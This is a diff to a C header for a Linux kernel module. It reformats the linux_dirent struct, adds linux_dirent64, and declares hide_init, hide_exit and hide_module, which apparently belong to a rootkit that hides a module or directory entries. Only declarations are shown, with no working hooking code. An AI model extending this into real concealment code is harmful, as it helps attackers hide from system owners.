@@ -4,15 +4,25 @@
 #include <linux/fs.h>
 #include <linux/dirent.h>
 
-/* linux_dirent (32-bit compat) — non exportée par le kernel */
-struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
+struct linux_dirent
+{
+    unsigned long d_ino;
+    unsigned long d_off;
     unsigned short d_reclen;
-    char           d_name[];
+    char d_name[];
 };
 
-int  hide_init(void);
+struct linux_dirent64
+{
+    unsigned long long d_ino;
+    long long d_off;
+    unsigned short d_reclen;
+    unsigned char d_type;
+    char d_name[];
+};
+
+// Init / Exit
+int hide_init(void);
 void hide_exit(void);
 
 void hide_module(void);
